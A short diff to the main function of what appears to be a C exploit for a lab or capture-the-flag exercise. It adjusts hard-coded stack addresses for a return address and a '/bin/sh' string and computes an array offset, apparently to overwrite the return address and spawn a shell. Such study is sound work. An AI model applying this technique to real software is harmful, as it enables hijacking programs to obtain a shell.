@@ -1,6 +1,6 @@
 int main() {
-	unsigned int ret_addr = 0xffffd51c;
-	unsigned int bin_sh = 0xffffd524;
+	unsigned int ret_addr = 0xffffd70c;
+	unsigned int bin_sh = ret_addr + 0x8;
 	unsigned int array_begin = 0xffffd544;
 
 	unsigned int offset_ret = (ret_addr - array_begin) / 4;
